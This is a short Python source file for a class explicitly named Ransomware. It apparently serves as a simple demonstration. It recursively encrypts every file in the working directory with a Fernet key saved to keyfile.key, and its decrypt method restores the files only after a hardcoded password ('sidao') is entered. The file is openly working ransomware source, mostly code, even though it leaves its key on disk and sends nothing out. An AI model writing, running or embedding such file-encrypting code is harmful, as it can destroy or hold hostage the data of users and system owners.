import os
from cryptography.fernet import Fernet


class Ransomware():
    def __init__(self):
        self.file_list = []
        self.senha = "sidao"
        self.key = ""
        self.ignore = ["ransom.py",
                       "keyfile.key",
                       "decrypt.py",
                       "ransomware.py",
                       "./__pycache__"]

    def get_file_list(self):
        self.file_list = []
        for file in os.listdir():
            if file in self.ignore or file[0] == ".":
                continue
            if os.path.isfile(file):
                self.file_list.append(file)

    def get_files_recursive(self, path='.'):
        self.file_list = []
        for root, dirs, files in os.walk(path):
            for file in files:
                if file not in self.ignore and root not in self.ignore:
                    self.file_list.append(os.path.join(root, file))

    def write_key(self):
        print("Writing key file")
        with open("keyfile.key", "wb") as keyfile:
            keyfile.write(self.key)

    def read_key(self):
        print("Reading key file")
        with open("keyfile.key", "rb") as keyfile:
            self.key = keyfile.read()

    def encrypt(self):
        print("Encrypting files")
        self.get_files_recursive()
        self.key = Fernet.generate_key()
        self.write_key()
        for file in self.file_list:
            with open(file, "rb") as target_file:
                file_content = target_file.read()
                target_encrypted = Fernet(self.key).encrypt(file_content)
            with open(file, "wb") as target_file:
                target_file.write(target_encrypted)
            print("Encrypted ", file)

    def ask_password(self) -> bool:
        senha_input = input("Senha? \n >>> ")
        if senha_input == self.senha:
            print("Senha correta")
            return True
        else:
            print("Senha errada")
            return False

    def decrypt(self):
        print("Decrypting files")
        self.read_key()
        self.get_files_recursive()
        f = Fernet(self.key)
        if self.ask_password():
            for file in self.file_list:
                with open(file, "rb") as target_file:
                    decrypted_content = f.decrypt(target_file.read())
                with open(file, "wb") as target_file:
                    target_file.write(decrypted_content)
                print("Decrypted ", file)
